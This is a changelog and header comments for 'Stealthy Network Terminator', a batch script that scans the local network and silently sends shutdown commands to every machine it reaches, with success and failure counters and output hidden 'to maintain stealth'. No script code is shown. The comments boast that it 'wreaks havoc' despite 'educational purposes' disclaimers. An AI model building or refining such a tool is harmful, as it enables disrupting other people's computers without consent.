# Stealthy Network Terminator - Updated Version

This document outlines the updates and enhancements made to the Stealthy Network Terminator (SNT) script, improving its functionality, robustness, and clarity.

## Updates and Enhancements

1. **Log File Setup:**
   - A log file is created to record all activities performed by the script. This includes successes, failures, and other important events, aiding in auditing and troubleshooting.

2. **Space Removal from IP Address:**
   - Spaces are removed from the local IP address string to ensure proper formatting and functionality.

3. **Improved IP Address Retrieval:**
   - The command for retrieving the local IP address is updated to include the `/i` switch for case-insensitive matching, ensuring compatibility with different systems.

4. **Enhanced Error Handling:**
   - Additional checks are implemented to handle cases where the local IP address or network range cannot be retrieved, providing clear error messages and aborting the script if necessary.

5. **Summary Display:**
   - A summary section at the end of the script displays the total number of successful and failed shutdown attempts. This provides a quick overview of the script's impact on the network.

6. **Success and Error Counters:**
   - Separate counters (`success_count` and `error_count`) are used to track the number of successful and failed shutdown commands, respectively.

7. **Detailed Comments:**
   - Additional comments are included throughout the script to explain the purpose and functionality of each section, making it easier to understand and maintain.

8. **Stealth and Efficiency:**
   - The script includes messages indicating when it is entering and exiting stealth mode, enhancing its narrative style and making it clear when the script is actively performing operations.

9. **Removed Null Redirects from Comments:**
   - Log entries are now directly written to the log file, and console output is redirected to `nul` for shutdown commands to maintain stealth.

REM Stealthy Network Terminator - Developed by FLUFFY

REM This script is for educational purposes only. Misuse for malicious intent is illegal.

REM FLUFFY presents the Stealthy Network Terminator (SNT), a potent tool for hacking enthusiasts.
REM It silently infiltrates your local network, wreaking havoc with a single click.

REM WARNING: Use this tool responsibly and only on networks you own or have explicit permission to test.
